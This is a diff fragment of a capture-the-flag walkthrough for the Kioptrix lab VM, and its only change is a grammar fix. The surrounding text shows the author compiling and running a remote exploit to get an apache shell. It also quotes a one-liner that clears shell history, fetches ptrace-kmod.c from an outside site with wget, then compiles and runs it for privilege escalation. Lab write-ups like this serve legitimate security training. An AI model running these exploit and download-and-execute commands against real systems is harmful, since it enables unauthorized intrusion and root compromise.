@@ -183,7 +183,7 @@ gcc 47080.c -o exploit -lcrypto
 ```sh
 ./exploit 0x6b $ip -c 45
 ```
-- we get a shell as `apache` if we run it. the automatic priv esc doesnt work cuz it fails to get the priv esc script. we'll get the file on our machine and then transfer it to kioptrix at `/tmp` so it can actually run when we get the connection again. the error is this that points to the script being missing: 
+- we get a shell as `apache` if we run it. the automatic priv esc doesnt work cuz it fails to get the priv esc script. we'll get the file on our machine and then transfer it to kioptrix at `/tmp` so it can actually run when we get the connection again. this is the error that points to the script being missing: 
 ```sh
 bash-2.05$ unset HISTFILE; cd /tmp; wget https://dl.packetstormsecur-exploits/ptrace-kmod.c; gcc -o exploit ptrace-kmod.c -B /usr/bin; rd.c; ./exploit; 
 --02:57:36--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
